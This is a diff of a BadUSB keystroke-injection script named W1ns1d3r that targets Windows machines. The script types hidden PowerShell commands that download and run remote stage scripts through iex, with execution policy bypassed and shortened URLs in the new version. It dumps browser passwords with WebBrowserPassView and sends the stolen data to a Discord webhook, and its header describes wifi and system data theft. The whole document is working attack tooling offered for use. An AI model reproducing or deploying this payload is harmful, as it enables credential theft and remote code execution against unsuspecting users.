@@ -1,53 +1,42 @@
 REM Title: W1ns1d3r
 REM Author: Kali-Gvte (https://github.com/Gvte-Kali/BadStuffHosting/tree/main/W1ns1d3r)
-REM Version: 2.2
-REM Traduction to english: Kali-Gvte (https://github.com/Gvte-Kali/BadStuffHosting/tree/main/W1ns1d3r)
-REM Credit Discord webhooks functions :I-am-jakoby
+REM Version: 2.3
+REM Credit Discord webhooks functions + ideas :I-am-jakoby
 REM Credit Wifi grabber : 7h30th3r0n3 and the0bone
 REM Credit Password Nirsoft : moosehadley
 REM Target:  Windows 10/11 (7/8 not tested)
 REM Supported Layout keyboard: US/FR/DE
 REM
-REM What it does
-REM 1. Extracts Antivirus software and version
-REM 2. Extracts some User Informations
-REM 3. Extracts some System Informations
-REM 4. Extracts Wifi Passwords in clear text
-REM 5. Extracts Web Browser Passwords in clear text
-REM 6. Sends all that data in a discord Webhook
+REM Most awesome Exfiltrator !!
 REM
-REM Usage : Put your discord WEBHOOK at line 28 and enjoy !
+REM Usage : Put your discord WEBHOOK and enjoy !
+REM
+REM !!!!!!!!!! NEED TO PUT YOUR WEBHOOK 2 TIMES !!!!!!!!!!
 REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell Start-Process powershell -Verb RunAs
-ENTER
-DELAY 1000
-LEFTARROW
-DELAY 1000
+STRING powershell
 ENTER
 DELAY 1000
 REM edit your webhook here
-STRING $DiscordUrl = 'DISCORDWEBHOOK'
+STRING $DiscordUrl = 'DISCORD_WEBHOOK'
 ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_4dm1n/stage_1_admin.ps1'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://shorturl.at/eDNP3'))
 ENTER
-DELAY 5000
+DELAY 6000
 STRING wbpv28821@
 ENTER
 STRING .\WebBrowserPassView.exe
 ENTER
-DELAY 3000
+DELAY 6000
 CTRL A
 CTRL S
 DELAY 2000
-STRING c:\temp\export.txt
+STRING c:\temp\w3b_br0ws3r_p4ssw0rds.txt
 ENTER
 DELAY 1000
 ALT F4
 DELAY 800
-STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
-ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_4dm1n/stage_2_admin.ps1'))
+STRING powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'DISCORD_WEBHOOK'; irm https://shorturl.at/qB358 | iex}"
 ENTER
